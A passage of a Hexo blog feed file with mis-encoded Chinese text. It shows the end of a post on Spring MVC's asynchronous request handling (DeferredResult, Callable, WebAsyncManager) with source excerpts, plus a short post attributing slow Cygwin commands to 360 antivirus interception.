stringDeferredResult = <span class="keyword">new</span> DeferredResult&lt;&gt;();</span><br><span class="line">       MoreExecutors.directExecutor().execute(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   Thread.sleep(<span class="number">30000</span>);</span><br><span class="line">                   stringDeferredResult.setResult(<span class="string">"index"</span>);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                   stringDeferredResult.setErrorResult(<span class="string">"error"</span>);</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">       <span class="keyword">return</span> stringDeferredResult;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>è¿™ç§æ–¹å¼è¿”å›çš„æ˜¯<code>DeferredResult</code>ï¼Œè®¡ç®—çš„é€»è¾‘å¯ä»¥åœ¨ä¸šåŠ¡çº¿ç¨‹æ± ä¸­è®¡ç®—ï¼Œå½“è®¡ç®—å®Œæˆåï¼Œ</p>
<p>ç›´æ¥å‘<code>DeferredResult</code>ä¸­setæ•°æ®å³å¯ï¼Œä¼šè§¦å‘åç»­çš„å¤„ç†ï¼Œå¹¶è¿”å›ç»™å®¢æˆ·ç«¯ã€‚</p>
<h3 id="å®ç°ç»†èŠ‚"><a href="#å®ç°ç»†èŠ‚" class="headerlink" title="å®ç°ç»†èŠ‚"></a>å®ç°ç»†èŠ‚</h3><p><code>RequestMappingHandlerAdapter</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * Invoke the &#123;<span class="doctag">@link</span> RequestMapping&#125; handler method preparing a &#123;<span class="doctag">@link</span> ModelAndView&#125;</span></span><br><span class="line"><span class="comment">   * if view resolution is required.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@since</span> 4.2</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@see</span> #createInvocableHandlerMethod(HandlerMethod)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">protected</span> ModelAndView <span class="title">invokeHandlerMethod</span><span class="params">(HttpServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">      HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    ServletWebRequest webRequest = <span class="keyword">new</span> ServletWebRequest(request, response);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      WebDataBinderFactory binderFactory = getDataBinderFactory(handlerMethod);</span><br><span class="line">      ModelFactory modelFactory = getModelFactory(handlerMethod, binderFactory);</span><br><span class="line"></span><br><span class="line">      ServletInvocableHandlerMethod invocableMethod = createInvocableHandlerMethod(handlerMethod);</span><br><span class="line">      invocableMethod.setHandlerMethodArgumentResolvers(<span class="keyword">this</span>.argumentResolvers);</span><br><span class="line">      invocableMethod.setHandlerMethodReturnValueHandlers(<span class="keyword">this</span>.returnValueHandlers);</span><br><span class="line">      invocableMethod.setDataBinderFactory(binderFactory);</span><br><span class="line">      invocableMethod.setParameterNameDiscoverer(<span class="keyword">this</span>.parameterNameDiscoverer);</span><br><span class="line"></span><br><span class="line">      ModelAndViewContainer mavContainer = <span class="keyword">new</span> ModelAndViewContainer();</span><br><span class="line">      mavContainer.addAllAttributes(RequestContextUtils.getInputFlashMap(request));</span><br><span class="line">      modelFactory.initModel(webRequest, mavContainer, invocableMethod);</span><br><span class="line">      mavContainer.setIgnoreDefaultModelOnRedirect(<span class="keyword">this</span>.ignoreDefaultModelOnRedirect);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//åˆ›å»ºå¼‚æ­¥è¯·æ±‚</span></span><br><span class="line">      AsyncWebRequest asyncWebRequest = WebAsyncUtils.createAsyncWebRequest(request, response);</span><br><span class="line">      asyncWebRequest.setTimeout(<span class="keyword">this</span>.asyncRequestTimeout);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//ä¸‹é¢çš„ä»£ç è®¾ç½®äº†Callableæ‰§è¡Œçš„çº¿ç¨‹æ± ï¼Œä»¥åŠæ‹¦æˆªå™¨è¿˜æœ‰DeferredResultçš„æ‹¦æˆªå™¨</span></span><br><span class="line">      WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);</span><br><span class="line">      asyncManager.setTaskExecutor(<span class="keyword">this</span>.taskExecutor);</span><br><span class="line">      asyncManager.setAsyncWebRequest(asyncWebRequest);</span><br><span class="line">      asyncManager.registerCallableInterceptors(<span class="keyword">this</span>.callableInterceptors);</span><br><span class="line">      asyncManager.registerDeferredResultInterceptors(<span class="keyword">this</span>.deferredResultInterceptors);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (asyncManager.hasConcurrentResult()) &#123;</span><br><span class="line">        Object result = asyncManager.getConcurrentResult();</span><br><span class="line">        mavContainer = (ModelAndViewContainer) asyncManager.getConcurrentResultContext()[<span class="number">0</span>];</span><br><span class="line">        asyncManager.clearConcurrentResult();</span><br><span class="line">        <span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">          logger.debug(<span class="string">"Found concurrent result value ["</span> + result + <span class="string">"]"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        invocableMethod = invocableMethod.wrapConcurrentResult(result);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      invocableMethod.invokeAndHandle(webRequest, mavContainer);</span><br><span class="line">      <span class="keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> getModelAndView(mavContainer, modelFactory, webRequest);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">finally</span> &#123;</span><br><span class="line">      webRequest.requestCompleted();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="Callable-çš„å¤„ç†"><a href="#Callable-çš„å¤„ç†" class="headerlink" title="Callable çš„å¤„ç†"></a>Callable çš„å¤„ç†</h4><p><code>Callable</code>çš„å¤„ç†æ˜¯åœ¨<code>CallableMethodReturnValueHandler</code>ä¸­çš„ï¼Œè¿™ä¸ªæ¥å£æœ€ç»ˆç»§æ‰¿äº†<code>HandlerMethodReturnValueHandler</code>, ä¹Ÿå°±æ˜¯å¯¹Controlleræ–¹æ³•è¿”å›å€¼çš„åå¤„ç†ã€‚</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CallableMethodReturnValueHandler</span> <span class="keyword">implements</span> <span class="title">AsyncHandlerMethodReturnValueHandler</span> </span>&#123;</span><br><span class="line">  <span class="comment">//çœç•¥...</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleReturnValue</span><span class="params">(Object returnValue, MethodParameter returnType,</span></span></span><br><span class="line"><span class="function"><span class="params">      ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (returnValue == <span class="keyword">null</span>) &#123;</span><br><span class="line">      mavContainer.setRequestHandled(<span class="keyword">true</span>);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Callable&lt;?&gt; callable = (Callable&lt;?&gt;) returnValue;</span><br><span class="line">    WebAsyncUtils.getAsyncManager(webRequest).startCallableProcessing(callable, mavContainer);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆæ˜¯è°ƒç”¨äº†<code>WebAsyncManager</code>çš„<code>startCallableProcessing</code>è¿›è¡Œå¤„ç†</p>
<p><code>WebAsyncManager</code>ä¸­çš„å…³é”®ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startCallableProcessing</span><span class="params">(Callable&lt;?&gt; callable, Object... processingContext)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Assert.notNull(callable, <span class="string">"Callable must not be null"</span>);</span><br><span class="line">    startCallableProcessing(<span class="keyword">new</span> WebAsyncTask(callable), processingContext);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startCallableProcessing</span><span class="params">(<span class="keyword">final</span> WebAsyncTask&lt;?&gt; webAsyncTask, Object... processingContext)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Assert.notNull(webAsyncTask, <span class="string">"WebAsyncTask must not be null"</span>);</span><br><span class="line">    Assert.state(<span class="keyword">this</span>.asyncWebRequest != <span class="keyword">null</span>, <span class="string">"AsyncWebRequest must not be null"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è¶…æ—¶</span></span><br><span class="line">    Long timeout = webAsyncTask.getTimeout();</span><br><span class="line">    <span class="keyword">if</span> (timeout != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.asyncWebRequest.setTimeout(timeout);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//çº¿ç¨‹æ± </span></span><br><span class="line">    AsyncTaskExecutor executor = webAsyncTask.getExecutor();</span><br><span class="line">    <span class="keyword">if</span> (executor != <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.taskExecutor = executor;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æ‹¦æˆªå™¨</span></span><br><span class="line">    List&lt;CallableProcessingInterceptor&gt; interceptors = <span class="keyword">new</span> ArrayList&lt;CallableProcessingInterceptor&gt;();</span><br><span class="line">    interceptors.add(webAsyncTask.getInterceptor());</span><br><span class="line">    interceptors.addAll(<span class="keyword">this</span>.callableInterceptors.values());</span><br><span class="line">    interceptors.add(timeoutCallableInterceptor);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> Callable&lt;?&gt; callable = webAsyncTask.getCallable();</span><br><span class="line">    <span class="keyword">final</span> CallableInterceptorChain interceptorChain = <span class="keyword">new</span> CallableInterceptorChain(interceptors);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//è¶…æ—¶å¤„ç†</span></span><br><span class="line">    <span class="keyword">this</span>.asyncWebRequest.addTimeoutHandler(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        logger.debug(<span class="string">"Processing timeout"</span>);</span><br><span class="line">        Object result = interceptorChain.triggerAfterTimeout(asyncWebRequest, callable);</span><br><span class="line">        <span class="keyword">if</span> (result != CallableProcessingInterceptor.RESULT_NONE) &#123;</span><br><span class="line">          setConcurrentResultAndDispatch(result);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æˆåŠŸçš„å›è°ƒï¼Œä¼šè§¦å‘æ‹¦æˆªå™¨çš„æ‹¦æˆª</span></span><br><span class="line">    <span class="keyword">this</span>.asyncWebRequest.addCompletionHandler(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        interceptorChain.triggerAfterCompletion(asyncWebRequest, callable);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ‹¦æˆª</span></span><br><span class="line">    interceptorChain.applyBeforeConcurrentHandling(<span class="keyword">this</span>.asyncWebRequest, callable);</span><br><span class="line">    startAsyncProcessing(processingContext);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.taskExecutor.submit(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          Object result = <span class="keyword">null</span>;</span><br><span class="line">          <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//æ‹¦æˆª</span></span><br><span class="line">            interceptorChain.applyPreProcess(asyncWebRequest, callable);</span><br><span class="line">            result = callable.call();</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">            result = ex;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">//æ‹¦æˆª</span></span><br><span class="line">            result = interceptorChain.applyPostProcess(asyncWebRequest, callable, result);</span><br><span class="line">          &#125;</span><br><span class="line">          setConcurrentResultAndDispatch(result);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (RejectedExecutionException ex) &#123;</span><br><span class="line">      Object result = interceptorChain.applyPostProcess(<span class="keyword">this</span>.asyncWebRequest, callable, ex);</span><br><span class="line">      setConcurrentResultAndDispatch(result);</span><br><span class="line">      <span class="keyword">throw</span> ex;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="DeferredResult-çš„å¤„ç†"><a href="#DeferredResult-çš„å¤„ç†" class="headerlink" title="DeferredResult çš„å¤„ç†"></a>DeferredResult çš„å¤„ç†</h4><p>DeferredResultçš„è¿”å›æ—¶æœºå°±æ˜¯æœ‰æ•°æ®çš„æ—¶å€™ï¼Œé¡ºè—¤æ‘¸ç“œ:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">setResult</span><span class="params">(T result)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> setResultInternal(result);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">setResultInternal</span><span class="params">(Object result)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Immediate expiration check outside of the result lock</span></span><br><span class="line">    <span class="keyword">if</span> (isSetOrExpired()) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DeferredResultHandler resultHandlerToUse;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">      <span class="comment">// Got the lock in the meantime: double-check expiration status</span></span><br><span class="line">      <span class="keyword">if</span> (isSetOrExpired()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// At this point, we got a new result to process</span></span><br><span class="line">      <span class="keyword">this</span>.result = result;</span><br><span class="line">      resultHandlerToUse = <span class="keyword">this</span>.resultHandler;</span><br><span class="line">      <span class="keyword">if</span> (resultHandlerToUse == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// No result handler set yet -&gt; let the setResultHandler implementation</span></span><br><span class="line">        <span class="comment">// pick up the result object and invoke the result handler for it.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// Result handler available -&gt; let's clear the stored reference since</span></span><br><span class="line">      <span class="comment">// we don't need it anymore.</span></span><br><span class="line">      <span class="keyword">this</span>.resultHandler = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// If we get here, we need to process an existing result object immediately.</span></span><br><span class="line">    <span class="comment">// The decision is made within the result lock; just the handle call outside</span></span><br><span class="line">    <span class="comment">// of it, avoiding any deadlock potential with Servlet container locks.</span></span><br><span class="line">    resultHandlerToUse.handleResult(result);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><code>DeferredResultHandler</code>æ˜¯ä»€ä¹ˆé¬¼ï¼Ÿæˆ‘ä»¬newçš„æ—¶å€™æ²¡æœ‰è®¾ç½®å•Šï¼Ÿï¼Ÿå…¶å®è¿™ä¸ªä¹Ÿæ˜¯ç”±<code>HandlerMethodReturnValueHandler</code>æ¥å®ç°çš„ï¼Œæœ‰ä¸ªå¯¹åº”çš„<code>DeferredResultMethodReturnValueHandler</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleReturnValue</span><span class="params">(Object returnValue, MethodParameter returnType,</span></span></span><br><span class="line"><span class="function"><span class="params">    ModelAndViewContainer mavContainer, NativeWebRequest webRequest)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (returnValue == <span class="keyword">null</span>) &#123;</span><br><span class="line">    mavContainer.setRequestHandled(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  DeferredResultAdapter adapter = getAdapterFor(returnValue.getClass());</span><br><span class="line">  Assert.notNull(adapter);</span><br><span class="line">  DeferredResult&lt;?&gt; result = adapter.adaptToDeferredResult(returnValue);</span><br><span class="line">  WebAsyncUtils.getAsyncManager(webRequest).startDeferredResultProcessing(result, mavContainer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ€ç»ˆè¿˜æ˜¯åˆ°äº†<code>WebAsyncManager</code>çš„å¤„ç†æ–¹æ³•ä¸­ï¼Œå’Œ<code>Callable</code>çš„å¤„ç†ç±»ä¼¼ï¼Œä¸ä¸€ä¸€æ·±å…¥ã€‚</p>
<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ­£æ˜¯åœ¨è¿™ä¸ª<code>startDeferredResultProcessing</code>ä¸­å¡å…¥äº†ä¸€ä¸ª<code>DeferredResultHandler</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">      interceptorChain.applyPreProcess(<span class="keyword">this</span>.asyncWebRequest, deferredResult);</span><br><span class="line">      deferredResult.setResultHandler(<span class="keyword">new</span> DeferredResultHandler() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleResult</span><span class="params">(Object result)</span> </span>&#123;</span><br><span class="line">          result = interceptorChain.applyPostProcess(asyncWebRequest, deferredResult, result);</span><br><span class="line">          setConcurrentResultAndDispatch(result);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">      setConcurrentResultAndDispatch(ex);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>å› ä¸ºæˆ‘ä»¬æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ï¼Œæ‰€ä»¥è™½ç„¶handlerçš„æ³¨å…¥åœ¨åé¢ï¼Œå…¶å®å½±å“ä¹Ÿä¸å¤§ï¼Œè€Œä¸”<code>setResult</code>ä¸­ä¹Ÿåšäº†åˆ¤æ–­ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><p><a href="http://www.journaldev.com/2008/async-servlet-feature-of-servlet-3" rel="external nofollow noopener noreferrer" target="_blank">Async Servlet Feature of Servlet 3 - JournalDev</a></p>
</li>
<li><p><a href="https://docs.oracle.com/javaee/7/tutorial/servlets012.htm" rel="external nofollow noopener noreferrer" target="_blank">17.12 Asynchronous Processing - Java Platform, Enterprise Edition: The Java EE Tutorial (Release 7)</a></p>
</li>
<li><p><a href="https://httpd.apache.org/docs/2.4/programs/ab.html" rel="external nofollow noopener noreferrer" target="_blank">ab - Apache HTTP server benchmarking tool - Apache HTTP Server Version 2.4</a></p>
</li>
<li><p><a href="http://www.ha97.com/5095.html" rel="external nofollow noopener noreferrer" target="_blank">ç³»ç»Ÿååé‡ï¼ˆTPSï¼‰ã€ç”¨æˆ·å¹¶å‘é‡ã€æ€§èƒ½æµ‹è¯•æ¦‚å¿µå’Œå…¬å¼</a></p>
</li>
<li><p><a href="https://lanjingling.github.io/2016/01/20/servlet3-new-furture/" rel="external nofollow noopener noreferrer" target="_blank">servlet3æ–°ç‰¹æ€§â€”â€”å¼‚æ­¥è¯·æ±‚å¤„ç† | æ™“çš„æŠ€æœ¯åšå®¢</a></p>
</li>
<li><p><a href="http://blog.csdn.net/wzy_1988/article/details/38922449" rel="external nofollow noopener noreferrer" target="_blank">è§£å†³java.util.concurrent.RejectedExecutionException - å°ä¸€çš„ä¸“æ  - åšå®¢é¢‘é“ - CSDN.NET</a></p>
</li>
<li><p><a href="http://www.lai18.com/content/2483896.html" rel="external nofollow noopener noreferrer" target="_blank">Springmvcå¼‚æ­¥æ”¯æŒæŠ¥é”™- - Lai18.com ITæŠ€æœ¯æ–‡ç« æ”¶è—å¤¹</a></p>
</li>
<li><p><a href="http://shengwangi.blogspot.hk/2015/09/asynchronous-spring-mvc-hello-world.html" rel="external nofollow noopener noreferrer" target="_blank">Asynchronous Spring MVC â€“ Hello World Example | Code Breeze !</a></p>
</li>
</ol>
]]></content>
      
        <categories>
            
            <category> spring </category>
            
        </categories>
        
        
        <tags>
            
            <tag> servlet </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[cygwinæ‰§è¡Œå‘½ä»¤éå¸¸æ…¢]]></title>
      <url>http://qsli.github.io/2017/02/20/cygwin-360/</url>
      <content type="html"><![CDATA[<p>cygwinåœ¨windowsä¸Šæä¾›äº†ä¸€å¥—ç±»ä¼¼linuxçš„å¼€å‘ç¯å¢ƒï¼Œç”¨èµ·æ¥è¿˜æ˜¯æŒºçˆ½çš„ã€‚</p>
<p>ä½†æ˜¯ä¸€ç›´å›°æ‰°æˆ‘çš„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œå¤ªæ…¢ï¼å…·ä½“ç°è±¡å°±æ˜¯ä½¿ç”¨<code>ls</code>éƒ½å¾—ç­‰åŠå¤©æ‰å‡ºç»“æœã€‚</p>
<p>çœ‹ç½‘ä¸Šçš„èµ„æ–™è¯´cygwinç¡®å®æ…¢ï¼Œå†åŠ ä¸Šæˆ‘ç”¨äº†<code>oh-my-zsh</code>ï¼Œæ›´æ˜¯æ…¢ä¸ŠåŠ æ…¢ã€‚</p>
<h2 id="å¯èƒ½çš„åŸå› "><a href="#å¯èƒ½çš„åŸå› " class="headerlink" title="å¯èƒ½çš„åŸå› "></a>å¯èƒ½çš„åŸå› </h2><p>è²Œä¼¼360å¯¹è¿™äº›å·¥å…·ç¨‹åºçš„è°ƒç”¨éƒ½ä¼šåšä¸€ä¸ªæ‹¦æˆªï¼Œåˆ¤æ–­ä¸‹æ˜¯å¦æœ‰é£é™©ã€‚</p>
<p>äºæ˜¯å¹²è„†æŠŠ360ç»™å¸è½½äº†ï¼Œç»ˆäº<code>ls</code>çš„é€Ÿåº¦å˜å¾—å¯ä»¥æ¥å—ã€‚ã€‚ã€‚ã€‚</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ol>
<li><a href="http://www.it1352.com/321952.html" rel="external nofollow noopener noreferrer" target="_blank">ä¸ºä»€ä¹ˆCygwinçš„æ‰§è¡Œshellå‘½ä»¤å¾ˆæ…¢ï¼Ÿ - ITå±‹-ç¨‹åºå‘˜è½¯ä»¶å¼€å‘æŠ€æœ¯åˆ†äº«ç¤¾åŒº</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> cygwin </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Intellij Ideaä¸­ä¸´æ—¶æ–‡ä»¶åŠŸèƒ½]]></title>
      <url>http://qsli.github.io/2017/02/15/idea-scratches/</url>
